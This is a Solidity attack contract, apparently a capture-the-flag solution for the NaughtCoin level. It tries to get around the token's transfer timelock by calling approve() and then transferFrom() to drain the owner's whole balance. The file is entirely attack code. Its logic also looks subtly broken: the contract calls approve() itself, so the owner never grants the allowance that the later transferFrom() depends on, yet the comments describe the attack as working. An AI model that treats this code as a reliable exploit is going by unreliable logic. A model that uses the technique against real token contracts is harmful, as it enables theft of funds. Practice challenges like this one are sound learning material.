// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./NaughtCoin.sol";

contract NaughtCoinAttack {
    NaughtCoin private naughtCoin;
    address public immutable owner;
    address public immutable spender;

    constructor(address _naughtCoinAddress) {
        naughtCoin = NaughtCoin(_naughtCoinAddress);
        owner = msg.sender; // holder of the tokens
        spender = address(this); // this contract
    }

    function approveAttack() public {
        // Ensure only the owner can approve the attack
        require(msg.sender == owner, "Only the owner can approve the attack");

        // Get current balance of the owner's tokens
        uint256 ownerBalance = naughtCoin.balanceOf(owner);

        // Approve spender to spend all of the owner's tokens
        naughtCoin.approve(spender, ownerBalance);
    }

    function attack() public {
        // Get current balance of the owner's tokens
        uint256 ownerBalance = naughtCoin.balanceOf(owner);

        // Transfer all of the owner's tokens to this contract, must be called from this contract
        naughtCoin.transferFrom(owner, spender , ownerBalance);
    }

    function getAllowance() public view returns (uint256) {
        return naughtCoin.allowance(owner, spender);
    }

    function getBalance() public view returns (uint256) {
        return naughtCoin.balanceOf(owner);
    }
}
